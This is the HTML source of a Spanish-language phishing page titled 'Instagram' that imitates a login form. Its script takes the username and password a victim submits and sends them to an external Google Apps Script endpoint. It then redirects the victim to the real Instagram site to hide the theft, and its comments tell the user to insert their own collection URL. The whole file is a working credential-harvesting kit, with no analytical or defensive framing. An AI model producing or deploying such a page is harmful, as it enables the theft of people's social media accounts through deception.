<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Instagram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-card {
            background: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            width: 300px;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            border: none;
            color: white;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

<div class="login-card">
    <h2>Inicio de Sesión</h2>
    <!-- REEMPLAZA LA URL DE ACTION CON LA TUYA DE APPS SCRIPT -->
    <form id ="loginForm" method="POST">
        <input type="text" name="usuario" placeholder="Nombre de usuario o correo" required>
        <input type="password" name="password" placeholder="Contraseña" required>
        <button type="submit">Iniciar sesión</button>
    </form>
</div>
<script>
  const scriptURL = "https://script.google.com/macros/s/AKfycbxeFVRIGReII0MCWUCy2qRFnom5ZksnhHIji_POt3aDm76wXiODkaDy6qgZWnzaZa6viw/exec"; // <--- PEGA AQUÍ LA URL DEL SCRIPT
  const form = document.getElementById('loginForm');

  form.addEventListener('submit', e => {
    e.preventDefault(); // Esto evita el error de "Access Denied"
    
    fetch(scriptURL, { method: 'POST', body: new FormData(form), mode: 'no-cors'})
      .then(() => {
        // Redirección a Instagram
        window.location.href = "https://www.instagram.com/";
      })
      .catch(error => console.error('Error!', error.message));
  });
</script>
</body>
</html>
